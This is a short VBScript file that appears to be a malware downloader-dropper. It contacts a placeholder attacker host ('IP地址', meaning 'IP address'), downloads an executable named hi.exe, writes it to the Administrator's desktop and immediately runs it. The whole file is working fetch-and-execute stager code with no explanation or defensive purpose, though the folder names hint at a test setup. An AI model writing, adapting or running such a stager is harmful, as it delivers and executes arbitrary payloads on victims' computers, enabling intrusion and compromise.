Set objShell = CreateObject("WScript.Shell")
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://IP地址/payload/hi.exe", False
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile "C:\Users\Administrator\Desktop\test\payload\vbs\hi.exe", 2
    objADOStream.Close
    objShell.Run "C:\Users\Administrator\Desktop\test\payload\vbs\hi.exe"
End If
